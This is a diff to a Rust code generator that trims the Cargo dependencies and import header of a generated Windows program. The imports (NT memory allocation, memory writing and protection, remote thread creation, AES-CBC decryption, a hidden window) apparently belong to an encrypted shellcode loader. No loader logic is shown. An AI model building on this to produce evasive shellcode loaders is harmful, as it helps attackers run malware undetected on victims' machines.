@@ -16,17 +16,12 @@ use std::io::{BufRead, BufReader, Read};
 pub fn maincargo() -> String {
     format!(
         r#"
-winapi = {{version = "0.3.9", features = ["psapi", "processthreadsapi","winnt","winbase", "impl-default", "memoryapi", "winuser", "wincon", "winbase"]}}
+winapi = {{version = "0.3.9", features = ["winnt","winbase", "memoryapi", "winuser", "wincon", "winbase"]}}
 ntapi = "0.4.0"
-winproc = "0.6.4"
 cbc = "0.1.2"
 rand_core = {{ version = "0.6", features = ["std"] }}
 aes = "0.8"
 base64 = "0.21.0"
-rand = "0.8"
-generic-array = "0.14.4"
-typenum = "1.14.0"
-pelite = "0.9.1"
 [profile.release]
 panic = "abort"
 lto = true
@@ -60,22 +55,16 @@ pub fn main_imports() -> String {
     format!(
         r#"#![allow(warnings)]
 #![windows_subsystem = "windows"]
-use ntapi::ntmmapi::{{NtAllocateVirtualMemory,NtWriteVirtualMemory, NtProtectVirtualMemory}};
-use ntapi::ntpsapi::{{NtCurrentProcess,NtCreateThreadEx}};
+use aes::cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}};
+use ntapi::ntmmapi::{{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory}};
 use ntapi::ntobapi::NtWaitForSingleObject;
-use winapi::um::winnt::MAXIMUM_ALLOWED;
-use winapi::ctypes::c_void;
+use ntapi::ntpsapi::{{NtCreateThreadEx, NtCurrentProcess}};
 use std::ptr;
-use base64::{{decode,encode}};
-use aes::cipher::{{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit}};
-use rand_core::{{OsRng, RngCore}};
-type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
+use winapi::ctypes::c_void;
+use winapi::um::winnt::MAXIMUM_ALLOWED;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
-use std::fs::File;
-use std::io::{{self, Read, BufReader, BufRead}};
+use base64::engine::{{general_purpose, Engine as _}};
 use std::u8;
-use std::io::prelude::*;
-use std::fs;
 "#
     )
 }
